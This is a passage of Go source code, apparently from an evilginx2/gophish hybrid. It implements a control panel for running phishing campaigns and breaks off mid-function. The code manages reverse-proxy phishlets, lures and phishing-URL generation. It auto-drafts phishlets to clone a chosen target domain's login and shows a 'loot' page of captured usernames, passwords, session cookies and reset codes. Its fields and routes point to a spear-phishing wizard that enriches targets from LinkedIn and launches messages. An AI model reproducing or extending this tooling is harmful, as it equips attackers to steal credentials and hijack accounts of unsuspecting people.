// Package panel provides the evilinx control panel mounted inside the unified
// gophish admin GUI. It is the BlackFish section of the single GUI: separate
// pages for phishlet management, domain & SSL, captured sessions (loot), and
// lures, plus a phishing-URL generator using the shared rid scheme. All pages
// run behind the gophish admin login and the gorilla/csrf middleware chain,
// so every POST form carries a csrf_token field.
package panel

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"html/template"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/csrf"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"

	"evilgophish/internal/config"
	"evilgophish/internal/phishletgen"
	ridlib "evilgophish/shared/rid"
)

// Page identifiers used for routing and tab highlighting.
const (
	pageOverview  = "overview"
	pagePhishlets = "phishlets"
	pageDomain    = "domain"
	pageSessions  = "sessions"
	pageLures     = "lures"
	pageSpear     = "spear"
)

// phishletInfo is the per-phishlet summary shown in the panel.
type phishletInfo struct {
	Name     string
	Enabled  bool
	Hostname string
	Unauth   string
}

// lureInfo is the per-lure summary shown in the panel; ID is the lure index.
type lureInfo struct {
	ID          int
	Phishlet    string
	Path        string
	Hostname    string
	RedirectUrl string
	Rid         string
}

// sessionView is a captured engine session rendered on the loot page.
type sessionView struct {
	ID         int
	Phishlet   string
	LandingURL string
	Username   string
	Password   string
	HasCreds   bool
	CookieHits int
	BodyHits   int
	HttpHits   int
	RemoteAddr string
	Created    string
	Updated    string
	Dump       string
	Custom     []customPair
	HasReset   bool
}

// customPair is a single custom (non-credential) field captured for a session,
// e.g. password-reset verification codes and recovery emails.
type customPair struct {
	Key   string
	Value string
}

// certResult is the outcome of probing a hostname for its TLS certificate.
type certResult struct {
	Expiry time.Time
	Err    string
}

// certView is the per-hostname certificate status shown on the domain page.
type certView struct {
	Hostname string
	Enabled  bool
	Present  bool
	Subject  string
	Issuer   string
	Expires  string
	DaysLeft int
	Err      string
}

// pageData carries the values rendered by the panel templates.
type pageData struct {
	Page             string
	Base             string
	Domain           string
	ExternalIP       string
	ListenURL        string
	HttpsPort        int
	DnsPort          int
	Phishlets        []phishletInfo
	PhishletSel      []string
	Lures            []lureInfo
	Sessions         []sessionView
	SessionsErr      string
	Certs            []certView
	CountPhishlets   int
	CountEnabled     int
	CountLures       int
	CountSessions    int
	CountSessionsOK  bool
	FormSel          string
	FormRid          string
	FormPath         string
	FormHost         string
	FormExtra        string
	FormLurePath     string
	FormLureHost     string
	FormLureRedirect string
	Result           string
	ResultErr        bool
	Csrf             string
	Msg              string
	MsgErr           bool
	// "New Phishlet" auto-generation state.
	AuditEnabled bool
	AuditJobID   string
	AuditDomain  string
	AuditSite    string
	AuditYAML    string
	AuditNotes   []string
	AuditErr     string
	// Spear-phishing wizard state (Target -> Channel -> Prompt -> Review).
	SpearEnabled     bool
	SpearJobID       string
	SpearRunning     bool
	SpearLang        string
	SpearLinkedIn    string
	SpearChannel     string
	SpearSender      string
	SpearProfile     map[string]string
	SpearTarget      map[string]string
	SpearPrompt      string
	SpearSubject     string
	SpearBody        string
	SpearGenerator   string
	SpearNotes       []string
	SpearErr         string
	SpearHasProfile  bool
	SpearHasResult   bool
	SpearProfiles    []string
	SpearProfilesErr string
	SpearCampaign    string
	SpearURL         string
	SpearPhone       string
	SpearDone        bool
	SpearDoneKind    string
	SpearDoneID      int64
	SpearDoneName    string
	SpearRows        []spearRow
	SpearArchived    []spearRow
	SpearListErr     string
	// Library picker: top-3 branded templates for this target.
	SpearPicks    []spearPick
	SpearPicksErr string
	// Full library dropdown, grouped by use case (same source as the picks).
	SpearLibGroups []spearLibGroup
	// Total templates in the full library (for the dropdown label).
	SpearLibTotal int
	// Signature-library refresh state for the picker button.
	SigRefreshJobID string
	SigRefreshing   bool
	SigRefreshErr   string
	SigRefreshDone  string
	// SpearGoto pins the visible wizard section (e.g. stay on step 3 while
	// a generation runs instead of flashing back to step 1).
	SpearGoto string
}

// auditJob is a single running/finished discovery job for the "New Phishlet"
// flow. Jobs are transient in-memory state; the phishlet is only persisted
// when the operator commits the (reviewed) YAML.
type auditJob struct {
	id      string
	domain  string
	status  string // running | done | error
	err     string
	report  phishletgen.Report
	yaml    string
	created time.Time
}

// Handler is the evilinx panel mounted under the admin web server.
type Handler struct {
	cfg          *core.Config
	base         string
	onChange     func()
	sessions     func() ([]*database.Session, error)
	certLookup   func(host string, port int) (certResult, error)
	tpl          *template.Template
	jobs         map[string]*auditJob
	jobsMu       sync.Mutex
	audit        config.SiteAuditorConfig
	phishletsDir string
	// Spear-phishing enrichment jobs and local admin API access for launch.
	spearJobs  map[string]*spearJob
	spearMu    sync.Mutex
	spearRun   spearRunnerFunc
	// Signature-library refresh jobs (sign.py harvest + convert).
	sigJobs map[string]*sigRefreshJob
	sigMu   sync.Mutex
	sigRun  sigRefreshFunc
	apiBase    string
	apiKeyFunc func() (string, error)
}

// Option configures the panel handler.
type Option func(*Handler)

// WithOnChange registers a callback that is invoked after every successful
// configuration mutation. It is typically used by the unified binary to call
// svc.SyncCertificates so newly-enabled hostnames get TLS certificates.
func WithOnChange(fn func()) Option {
	return func(h *Handler) { h.onChange = fn }
}

// WithSessions provides the function used to list captured engine sessions
// for the loot page. It is typically wired to the proxy engine's buntdb
// database (engine.DB.ListSessions) by the unified binary.
func WithSessions(fn func() ([]*database.Session, error)) Option {
	return func(h *Handler) { h.sessions = fn }
}

// WithCertLookup overrides how the domain page probes hostnames for their
// TLS certificates. The default dials host:port with a short timeout and
// reports the presented leaf certificate.
func WithCertLookup(fn func(host string, port int) (certResult, error)) Option {
	return func(h *Handler) { h.certLookup = fn }
}

// WithBase overrides the mount point prefix used for links and form actions
// rendered in the panel pages. It must match the prefix the handler is
// mounted under (via http.StripPrefix); the default is "/evilginx".
func WithBase(base string) Option {
	return func(h *Handler) { h.base = base }
}

// WithSiteAuditor enables the "New Phishlet" auto-generation form and points
// it at the standalone harvester script (tools/phishlet_harvester.py) and the
// Python interpreter used to invoke it.
func WithSiteAuditor(cfg config.SiteAuditorConfig) Option {
	return func(h *Handler) { h.audit = cfg }
}

// WithPhishletsDir provides the directory new phishlets are written to. It
// must be the same directory the proxy engine scans at startup.
func WithPhishletsDir(dir string) Option {
	return func(h *Handler) { h.phishletsDir = dir }
}

// New builds the panel handler around the proxy engine's configuration.
func New(cfg *core.Config, opts ...Option) http.Handler {
	h := &Handler{
		cfg:        cfg,
		base:       "/evilginx",
		tpl:        template.Must(template.New("panel").Parse(pageTemplate)),
		certLookup: dialCert,
		jobs:       make(map[string]*auditJob),
		spearJobs:  make(map[string]*spearJob),
		spearRun:   defaultSpearRunner,
		sigJobs:    make(map[string]*sigRefreshJob),
		audit: config.SiteAuditorConfig{
			Enabled: false,
			Python:  "python",
			Timeout: config.DefaultSiteAuditorTimeout,
		},
	}
	for _, o := range opts {
		o(h)
	}
	return h
}

// dialCert connects to host:port over TLS and returns the presented leaf
// certificate's expiry. It is the default certificate probe for the domain
// page; failures mean "no usable certificate" for that hostname.
func dialCert(host string, port int) (certResult, error) {
	d := net.Dialer{Timeout: 3 * time.Second}
	conn, err := tls.DialWithDialer(&d, "tcp", fmt.Sprintf("%s:%d", host, port), &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return certResult{Err: shortErr(err)}, nil
	}
	defer conn.Close()
	state := conn.ConnectionState()
	if len(state.PeerCertificates) == 0 {
		return certResult{Err: "no certificate presented"}, nil
	}
	return certResult{Expiry: state.PeerCertificates[0].NotAfter}, nil
}

func shortErr(err error) string {
	msg := err.Error()
	if i := strings.Index(msg, ": "); i >= 0 {
		msg = msg[i+2:]
	}
	if len(msg) > 120 {
		msg = msg[:120] + "…"
	}
	return msg
}

// ServeHTTP dispatches requests to the panel routes. It is mounted with
// http.StripPrefix, so the URL path seen here is relative to the mount point.
func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	if len(path) > 1 {
		path = strings.TrimSuffix(path, "/")
	}
	switch path {
	case "", "/":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.overview(w, r)
	case "/phishlets":
		if r.Method == http.MethodPost {
			h.phishletAction(w, r)
		} else {
			h.phishletsPage(w, r)
		}
	case "/phishlets/create":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.phishletCreate(w, r)
	case "/phishlets/commit":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.phishletCommit(w, r)
	case "/phishlets/jobs":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.phishletJobs(w, r)
	case "/domain":
		if r.Method == http.MethodPost {
			h.domainAction(w, r)
		} else {
			h.domainPage(w, r)
		}
	case "/sessions":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.sessionsPage(w, r)
	case "/lures":
		if r.Method == http.MethodPost {
			h.luresCreate(w, r)
		} else {
			h.luresPage(w, r)
		}
	case "/lures/delete":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.luresDelete(w, r)
	case "/phishurl":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.phishurl(w, r)
	case "/spear":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearList(w, r)
	case "/spear/new":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearPage(w, r)
	case "/spear/enrich":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearEnrich(w, r)
	case "/spear/jobs":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearJobsStatus(w, r)
	case "/spear/generate":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearGenerate(w, r)
	case "/spear/profile":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearProfileSave(w, r)
	case "/spear/launch":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearLaunch(w, r)
	case "/spear/library":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearUseLibrary(w, r)
	case "/spear/refine":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearRefine(w, r)
	case "/spear/message":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearMessageSave(w, r)
	case "/spear/signatures/refresh":
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearSigRefresh(w, r)
	case "/spear/signatures/status":
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.spearSigStatus(w, r)
	default:
		http.NotFound(w, r)
	}
}

func (h *Handler) overview(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageOverview)
	h.withPhishlets(&d)
	h.withLures(&d)
	h.withSessions(&d)
	h.render(w, r, "page-overview", d)
}

func (h *Handler) phishletsPage(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pagePhishlets)
	h.withPhishlets(&d)
	h.withAudit(&d)
	if jid := r.URL.Query().Get("job"); jid != "" {
		h.applyAuditJob(&d, jid)
	}
	h.render(w, r, "page-phishlets", d)
}

// withAudit fills the "New Phishlet" feature availability flag.
func (h *Handler) withAudit(d *pageData) {
	d.AuditEnabled = h.audit.Enabled && h.audit.Python != "" && h.audit.Script != ""
}

// applyAuditJob renders the current state of a discovery job into the page:
// a polling banner while running, an editable YAML preview when finished, or
// an error banner on failure.
func (h *Handler) applyAuditJob(d *pageData, jid string) {
	j := h.getJob(jid)
	if j == nil {
		d.AuditErr = "Discovery job not found."
		return
	}
	d.AuditDomain = j.domain
	switch j.status {
	case "running":
		d.AuditJobID = j.id
	case "done":
		d.AuditSite = j.report.Site
		d.AuditYAML = j.yaml
		d.AuditNotes = j.report.Notes
	case "error":
		d.AuditErr = j.err
	}
}

// phishletCreate starts a background discovery job for the submitted domain.
// The page re-renders immediately with the running banner; the embedded
// script polls /phishlets/jobs and reloads with ?job=<id> on completion.
func (h *Handler) phishletCreate(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pagePhishlets)
	h.withPhishlets(&d)
	h.withAudit(&d)
	if err := r.ParseForm(); err != nil {
		d.AuditErr = "Failed to parse form: " + err.Error()
		h.render(w, r, "page-phishlets", d)
		return
	}
	domain := cleanDomain(r.PostFormValue("domain"))
	if domain == "" {
		d.AuditErr = "Provide a target domain."
		h.render(w, r, "page-phishlets", d)
		return
	}
	d.AuditDomain = domain

	if !h.audit.Enabled || h.audit.Python == "" || h.audit.Script == "" {
		d.AuditErr = "Site auditor is not configured. Add a site_auditor section (python/script) to config.json."
		h.render(w, r, "page-phishlets", d)
		return
	}

	j := &auditJob{id: core.GenRandomToken(), domain: domain, status: "running", created: time.Now()}
	h.setJob(j)
	go h.runAudit(j)

	d.AuditJobID = j.id
	h.render(w, r, "page-phishlets", d)
}

// runAudit executes the harvester script in a subprocess, parses its report
// JSON and generates the draft phishlet YAML. All failure modes land in the
// job's status/err. The subprocess runs with a hard timeout from the config.
func (h *Handler) runAudit(j *auditJob) {
	defer func() {
		if rec := recover(); rec != nil {
			h.failJob(j.id, fmt.Sprintf("auditor panic: %v", rec))
		}
	}()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(h.audit.Timeout)*time.Second)
	defer cancel()

	outPath := filepath.Join(os.TempDir(), fmt.Sprintf("phishlet_report_%s.json", j.id))
	defer os.Remove(outPath)

	cmd := exec.CommandContext(ctx, h.audit.Python, h.audit.Script,
		"--domain", j.domain, "--out", outPath,
		"--timeout", strconv.Itoa(h.audit.Timeout))
	var stderr strings.Builder
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		detail := strings.TrimSpace(stderr.String())
		if strings.Contains(detail, "no login form found") {
			detail += "\n(hint: the site may be behind Cloudflare/bot-protection, or its login page is at a path that was not guessed)"
		}
		if len(detail) > 2000 {
			detail = detail[:2000] + "…"
		}
		if detail != "" {
			h.failJob(j.id, fmt.Sprintf("harvester failed: %v (%s)", err, detail))
		} else {
			h.failJob(j.id, fmt.Sprintf("harvester failed: %v", err))
		}
		return
	}

	data, err := os.ReadFile(outPath)
	if err != nil {
		h.failJob(j.id, "harvester wrote no report: "+err.Error())
		return
	}
	var report phishletgen.Report
	if err := json.Unmarshal(data, &report); err != nil {
		h.failJob(j.id, "invalid audit report: "+err.Error())
		return
	}
	yamlText, err := phishletgen.Render(report)
	if err != nil {
		h.failJob(j.id, "could not draft phishlet: "+err.Error())
		return
	}

	h.jobsMu.Lock()
	if cur := h.jobs[j.id]; cur != nil {
		cur.status = "done"
		cur.report = report
		cur.yaml = yamlText
	}
	h.jobsMu.Unlock()
}

// failJob marks a job as failed with the given message.
func (h *Handler) failJob(id, msg string) {
	h.jobsMu.Lock()
	if cur := h.jobs[id]; cur != nil {
		cur.status = "error"
		cur.err = msg
	}
	h.jobsMu.Unlock()
}

// phishletJobs returns the JSON status of a single job (or of all jobs) for
// the polling script on the phishlets page. GET only, so no CSRF token is
// involved.
func (h *Handler) phishletJobs(w http.ResponseWriter, r *http.Request) {
	type jobStatus struct {
		Job    string `json:"job"`
		Domain string `json:"domain"`
		Status string `json:"status"`
		Err    string `json:"err,omitempty"`
		Site   string `json:"site,omitempty"`
	}
	enc := json.NewEncoder(w)
	if q := r.URL.Query().Get("job"); q != "" {
		j := h.getJob(q)
		if j == nil {
			enc.Encode(jobStatus{Job: q, Status: "missing"})
			return
		}
		enc.Encode(jobStatus{Job: j.id, Domain: j.domain, Status: j.status, Err: j.err, Site: j.report.Site})
		return
	}
	h.jobsMu.Lock()
	list := make([]*auditJob, 0, len(h.jobs))
	for _, j := range h.jobs {
		list = append(list, j)
	}
	h.jobsMu.Unlock()
	sort.Slice(list, func(i, jj int) bool { return list[i].created.After(list[jj].created) })
	out := make([]jobStatus, 0, len(list))
	for _, j := range list {
		out = append(out, jobStatus{Job: j.id, Domain: j.domain, Status: j.status, Err: j.err, Site: j.report.Site})
	}
	enc.Encode(out)
}

// phishletCommit writes a reviewed phishlet YAML to the phishlets directory
// and registers it with the running configuration so it appears in the table
// immediately (and again automatically after a restart).
func (h *Handler) phishletCommit(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pagePhishlets)
	h.withPhishlets(&d)
	h.withAudit(&d)
	if err := r.ParseForm(); err != nil {
		d.AuditErr = "Failed to parse form: " + err.Error()
		h.render(w, r, "page-phishlets", d)
		return
	}
	site := strings.TrimSpace(r.PostFormValue("site"))
	yamlText := r.PostFormValue("yaml")
	jobID := strings.TrimSpace(r.PostFormValue("job"))

	if site == "" || strings.TrimSpace(yamlText) == "" {
		d.AuditErr = "Phishlet name and YAML content are required."
		h.render(w, r, "page-phishlets", d)
		return
	}
	if h.phishletsDir == "" {
		d.AuditErr = "Phishlets directory is not configured for this panel."
		h.render(w, r, "page-phishlets", d)
		return
	}
	if _, err := phishletgen.WritePhishlet(h.cfg, h.phishletsDir, site, []byte(yamlText)); err != nil {
		d.AuditErr = "Could not create phishlet: " + err.Error()
		h.render(w, r, "page-phishlets", d)
		return
	}
	if jobID != "" {
		h.deleteJob(jobID)
	}
	d.Msg = fmt.Sprintf("Phishlet %q created and registered.", site)
	h.fireOnChange()
	h.withPhishlets(&d)
	h.render(w, r, "page-phishlets", d)
}

// setJob stores a job, evicting the oldest one when the map is over a small
// cap so memory stays bounded.
func (h *Handler) setJob(j *auditJob) {
	h.jobsMu.Lock()
	defer h.jobsMu.Unlock()
	if len(h.jobs) >= 20 {
		var oldest string
		var oldestTime time.Time
		for k, v := range h.jobs {
			if oldest == "" || v.created.Before(oldestTime) {
				oldest, oldestTime = k, v.created
			}
		}
		delete(h.jobs, oldest)
	}
	h.jobs[j.id] = j
}

func (h *Handler) getJob(id string) *auditJob {
	h.jobsMu.Lock()
	defer h.jobsMu.Unlock()
	return h.jobs[id]
}

func (h *Handler) deleteJob(id string) {
	h.jobsMu.Lock()
	defer h.jobsMu.Unlock()
	delete(h.jobs, id)
}

// cleanDomain normalizes a user-supplied target into a bare hostname.
func cleanDomain(s string) string {
	s = strings.TrimSpace(strings.ToLower(s))
	if i := strings.Index(s, "://"); i >= 0 {
		s = s[i+3:]
	}
	if i := strings.Index(s, "/"); i >= 0 {
		s = s[:i]
	}
	if i := strings.LastIndex(s, ":"); i >= 0 {
		if port, err := strconv.Atoi(s[i+1:]); err == nil && port > 0 {
			s = s[:i]
		}
	}
	return strings.TrimSuffix(s, ".")
}

// phishletAction processes a POST that modifies a single phishlet: set its
// hostname, enable it, or disable it. The action is determined by the value
// of the "action" submit button.
func (h *Handler) phishletAction(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pagePhishlets)
	h.withPhishlets(&d)
	if err := r.ParseForm(); err != nil {
		d.Msg, d.MsgErr = "Failed to parse form: "+err.Error(), true
		h.render(w, r, "page-phishlets", d)
		return
	}
	site := r.PostFormValue("site")
	action := r.PostFormValue("action")
	hostname := strings.TrimSpace(r.PostFormValue("hostname"))
	d.FormSel = site

	if !h.phishletExists(site) {
		d.Msg, d.MsgErr = fmt.Sprintf("Unknown phishlet %q.", site), true
		h.render(w, r, "page-phishlets", d)
		return
	}

	switch action {
	case "hostname":
		if h.cfg.GetBaseDomain() == "" {
			d.Msg, d.MsgErr = "Set the base domain (Domain & SSL page) before assigning hostnames.", true
			break
		}
		if !h.cfg.SetSiteHostname(site, hostname) {
			d.Msg, d.MsgErr = "Could not set hostname – ensure the base domain is configured correctly.", true
			break
		}
		d.Msg = fmt.Sprintf("Hostname for %q set to %s.", site, hostname)
	case "enable":
		hostname, _ := h.cfg.GetSiteDomain(site)
		if strings.TrimSpace(hostname) == "" {
			d.Msg, d.MsgErr = "Set a hostname for this phishlet before enabling it.", true
			break
		}
		if err := h.cfg.SetSiteEnabled(site); err != nil {
			d.Msg, d.MsgErr = fmt.Sprintf("Enable failed: %v", err), true
			break
		}
		d.Msg = fmt.Sprintf("Phishlet %q enabled.", site)
	case "disable":
		if err := h.cfg.SetSiteDisabled(site); err != nil {
			d.Msg, d.MsgErr = fmt.Sprintf("Disable failed: %v", err), true
			break
		}
		d.Msg = fmt.Sprintf("Phishlet %q disabled.", site)
	default:
		d.Msg, d.MsgErr = "Unknown action.", true
	}
	h.fireOnChange()
	h.withPhishlets(&d)
	h.render(w, r, "page-phishlets", d)
}

func (h *Handler) domainPage(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageDomain)
	h.withPhishlets(&d)
	h.withCerts(&d)
	h.render(w, r, "page-domain", d)
}

// domainAction processes a POST from the Domain & SSL page: saving the server
// settings (action "save", the default) or kicking off a certificate sync in
// the background (action "sync").
func (h *Handler) domainAction(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageDomain)
	h.withPhishlets(&d)
	if err := r.ParseForm(); err != nil {
		d.Msg, d.MsgErr = "Failed to parse form: "+err.Error(), true
		h.render(w, r, "page-domain", d)
		return
	}
	if r.PostFormValue("action") == "sync" {
		h.fireOnChangeAsync()
		d.Msg = "Certificate sync started in the background – watch the server log."
		h.withCerts(&d)
		h.render(w, r, "page-domain", d)
		return
	}

	domain := strings.TrimSpace(r.PostFormValue("domain"))
	ip := strings.TrimSpace(r.PostFormValue("external_ip"))

	if domain == "" && ip == "" {
		d.Msg, d.MsgErr = "Nothing to update – provide a base domain and/or an external IP.", true
		h.withCerts(&d)
		h.render(w, r, "page-domain", d)
		return
	}
	if domain != "" {
		h.cfg.SetBaseDomain(domain)
		d.Domain = domain
	}
	if ip != "" {
		h.cfg.SetServerExternalIP(ip)
		d.ExternalIP = ip
	}
	h.fireOnChange()
	d.Msg = "Server settings updated."
	h.withCerts(&d)
	h.render(w, r, "page-domain", d)
}

func (h *Handler) sessionsPage(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageSessions)
	h.withSessions(&d)
	h.render(w, r, "page-sessions", d)
}

func (h *Handler) luresPage(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageLures)
	h.withPhishlets(&d)
	h.withLures(&d)
	q := r.URL.Query()
	d.FormSel = firstNonEmpty(q.Get("p"), d.FormSel)
	d.FormRid = q.Get("rid")
	d.FormPath = q.Get("path")
	d.FormHost = q.Get("host")
	d.FormExtra = q.Get("extra")
	h.render(w, r, "page-lures", d)
}

// luresCreate processes a POST that creates a new lure for a phishlet. The
// path defaults to a random value when left empty; an optional hostname and
// redirect URL can be supplied for the lure page.
func (h *Handler) luresCreate(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageLures)
	h.withPhishlets(&d)
	h.withLures(&d)
	if err := r.ParseForm(); err != nil {
		d.Msg, d.MsgErr = "Failed to parse form: "+err.Error(), true
		h.render(w, r, "page-lures", d)
		return
	}
	site := r.PostFormValue("phishlet")
	path := strings.TrimSpace(r.PostFormValue("path"))
	host := strings.TrimSpace(r.PostFormValue("hostname"))
	redirect := strings.TrimSpace(r.PostFormValue("redirect"))
	d.FormSel = site
	d.FormLurePath = path
	d.FormLureHost = host
	d.FormLureRedirect = redirect

	if !h.phishletExists(site) {
		d.Msg, d.MsgErr = fmt.Sprintf("Unknown phishlet %q.", site), true
		h.render(w, r, "page-lures", d)
		return
	}
	if path == "" {
		path = "/" + core.GenRandomString(8)
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}

	l := &core.Lure{
		Phishlet:    site,
		Path:        path,
		Hostname:    host,
		RedirectUrl: redirect,
	}
	h.cfg.AddLure(site, l)
	lures := h.cfg.GetLures()
	d.Msg = fmt.Sprintf("Created lure %d for %q at %s.", len(lures)-1, site, path)
	d.FormLurePath = ""
	d.FormLureHost = ""
	d.FormLureRedirect = ""
	h.fireOnChange()
	h.withLures(&d)
	h.render(w, r, "page-lures", d)
}

// luresDelete processes a POST that removes the lure with the given index.
func (h *Handler) luresDelete(w http.ResponseWriter, r *http.Request) {
	d := h.baseData(pageLures)
	h.withPhishlets(&d)
	h.withLures(&d)
	if err := r.ParseForm(); err != nil {
		d.Msg, d.MsgErr = "Failed to parse form: "+err.Error(), true
		h.render(w, r, "page-lures", d)
		return
	}
	id, err := strconv.Atoi(r.PostFormValue("id"))
	if err != nil {
		d.Msg, d.MsgErr = "Invalid lure id.", true
		h.render(w, r, "page-lures", d)
		return
	}
	if err := h.cfg.DeleteLure(id); err != nil {
		d.Msg, d.MsgErr = fmt.Sprintf("Delete failed: %v", err), true
		h.render(w, r, "page-lures", d)
		return
	}
	d.Msg = fmt.Sprintf("Deleted lure %d.", id)
	h.fireOnChange()
	h.withLures(&d)
	h.render(w, r, "page-lures", d)
}

// phishurl renders the lures page with a phishing URL generated from the
// query parameters. It uses GET so it can run behind the gorilla/csrf wrapper
// without a token. When the requested path has no lure yet, one is created so
// the generated URL is immediately usable (lure paths are how the phish host
// decides whether a request is a real session or an unauthorized redirect). A
// "host" query parameter optionally overrides the phishlet hostname (used by
// lure paths).
func (h *Handler) phishurl(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	d := h.baseData(pageLures)
	h.withPhishlets(&d)
	h.withLures(&d)
	d.FormSel = firstNonEmpty(q.Get("p"), d.FormSel)
	d.FormRid = q.Get("rid")
	d.FormPath = q.Get("path")
	d.FormHost = q.Get("host")
	d.FormExtra = q.Get("extra")

	phishurl, err := generatePhishURL(h.cfg, d.FormSel, d.FormHost, d.FormRid, d.FormPath, d.FormExtra)
	if err != nil {
		d.Result, d.ResultErr = "Error: "+err.Error(), true
	} else {
		d.Result = phishurl
		if h.ensureLure(d.FormSel, d.FormHost, d.FormPath) {
			d.Msg = "Auto-created a lure for the generated URL path so it is immediately usable."
			h.fireOnChange()
			h.withLures(&d)
		}
	}
	h.render(w, r, "page-lures", d)
}

// ensureLure creates a lure for phishlet/path when no existing lure covers
// the URL being generated. The host that appears in the generated URL is the
// override host when given, otherwise the phishlet's landing phish host; a
// lure covers that URL if GetLureByPath would match it (hostname equality or
// the phishlet's landing phish host). Non-empty host is stored on the lure so
// it only serves that override hostname. It reports whether a new lure was
// actually created.
func (h *Handler) ensureLure(phishlet, host, phishPath string) bool {
	pl, err := h.cfg.GetPhishlet(phishlet)
	if err != nil {
		return false
	}
	host = strings.TrimSpace(host)
	resolvedHost := host
	if resolvedHost == "" {
		resolvedHost = pl.GetLandingPhishHost()
	}
	if resolvedHost == "" {
		resolvedHost, _ = h.cfg.GetSiteDomain(phishlet)
	}
	phishPath = strings.TrimSpace(phishPath)
	if phishPath == "" {
		phishPath = "/"
	}
	if !strings.HasPrefix(phishPath, "/") {
		phishPath = "/" + phishPath
	}
	for _, l := range h.cfg.GetLures() {
		if l.Phishlet == phishlet && l.Path == phishPath {
			if l.Hostname == resolvedHost || resolvedHost == pl.GetLandingPhishHost() {
				return false
			}
		}
	}
	h.cfg.AddLure(phishlet, &core.Lure{
		Phishlet: phishlet,
		Path:     phishPath,
		Hostname: host,
	})
	return true
}

// baseData assembles the engine status shared by every page.
func (h *Handler) baseData(page string) pageData {
	return pageData{
		Page:       page,
		Domain:     h.cfg.GetBaseDomain(),
		ExternalIP: h.cfg.GetServerExternalIP(),
		ListenURL:  fmt.Sprintf("%s:%d", h.cfg.GetServerBindIP(), h.cfg.GetHttpsPort()),
		HttpsPort:  h.cfg.GetHttpsPort(),
		DnsPort:    h.cfg.GetDnsPort(),
	}
}

// withPhishlets fills the phishlet table, selector, and counters.
func (h *Handler) withPhishlets(d *pageData) {
	enabled := map[string]bool{}
	for _, s := range h.cfg.GetEnabledSites() {
		enabled[s] = true
	}

	names := h.cfg.GetPhishletNames()
	sort.Strings(names)

	d.PhishletSel = names
	d.CountPhishlets = len(names)
	for _, name := range names {
		hostname, _ := h.cfg.GetSiteDomain(name)
		unauth, _ := h.cfg.GetSiteUnauthUrl(name)
		if enabled[name] {
			d.CountEnabled++
		}
		d.Phishlets = append(d.Phishlets, phishletInfo{
			Name:     name,
			Enabled:  enabled[name],
			Hostname: hostname,
			Unauth:   unauth,
		})
	}
	if d.FormSel == "" && len(names) > 0 {
		d.FormSel = names[0]
	}
}

// withLures fills the lure list and counter.
func (h *Handler) withLures(d *pageData) {
	d.Lures = nil
	for i, l := range h.cfg.GetLures() {
		d.Lures = append(d.Lures, lureInfo{
			ID:          i,
			Phishlet:    l.Phishlet,
			Path:        l.Path,
			Hostname:    l.Hostname,
			RedirectUrl: l.RedirectUrl,
			Rid:         core.GenRandomString(8),
		})
	}
	d.CountLures = len(d.Lures)
}

// withSessions fills the captured loot table from the engine session store.
// When no session provider is configured the page explains how to enable it.
func (h *Handler) withSessions(d *pageData) {
	if h.sessions == nil {
		d.SessionsErr = "Session store unavailable – the panel was started without engine access."
		return
	}
	sessions, err := h.sessions()
	if err != nil {
		d.SessionsErr = "Could not list sessions: " + err.Error()
		return
	}
	sort.Slice(sessions, func(i, j int) bool { return sessions[i].UpdateTime > sessions[j].UpdateTime })
	d.CountSessions = len(sessions)
	d.CountSessionsOK = true
	for _, s := range sessions {
		dump, _ := json.MarshalIndent(s, "", "  ")
		cookieHits := 0
